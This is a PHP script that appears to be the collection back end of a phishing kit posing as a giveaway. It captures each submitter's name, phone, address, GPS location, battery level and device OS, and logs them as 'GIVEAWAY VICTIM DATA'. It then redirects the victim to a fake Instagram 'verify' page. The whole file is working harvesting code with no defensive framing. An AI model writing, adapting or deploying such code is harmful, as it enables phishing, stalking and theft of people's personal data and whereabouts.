<?php
$name = $_POST['name'] ?? 'N/A';
$phone = $_POST['phone'] ?? 'N/A';
$address = $_POST['address'] ?? 'N/A';
$lat = $_POST['lat'] ?? 'Not Shared';
$lon = $_POST['lon'] ?? 'Not Shared';
$battery = $_POST['battery'] ?? 'Unknown';
$os = $_POST['os'] ?? 'Unknown';

// Generate Google Maps Link
$gmaps_link = ($lat !== 'Not Shared') ? "https://www.google.com/maps?q=$lat,$lon" : "Location Permission Denied";

$log_entry = "━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n";
$log_entry .= "  [GIVEAWAY VICTIM DATA]\n";
$log_entry .= "━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n";
$log_entry .= "Name     : $name\n";
$log_entry .= "Phone    : $phone\n";
$log_entry .= "Address  : $address\n";
$log_entry .= "Device   : $os\n";
$log_entry .= "Battery  : $battery\n";
$log_entry .= "Location : $gmaps_link\n";
$log_entry .= "━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n\n";

// Save to logs/output.txt
file_put_contents("../../logs/output.txt", $log_entry, FILE_APPEND);

// Redirect to a "Success" page or back to original Insta to "Verify"
header("Location: ../insta/index.php"); 
exit();
?>